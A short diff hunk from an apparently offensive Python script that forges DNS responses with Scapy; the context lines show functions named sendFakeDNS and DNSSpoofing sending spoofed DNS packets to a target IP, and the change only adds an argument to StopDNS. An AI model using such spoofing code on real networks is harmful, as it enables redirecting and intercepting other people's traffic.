@@ -21,7 +21,7 @@ def sendFakeDNS(pkt):
         dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(rrname="61.13.148.37"))
         send(dnsResPacket)
     else:
-        StopDNS()
+        StopDNS("e")
     
 
 def DNSSpoofing(gatewayip):
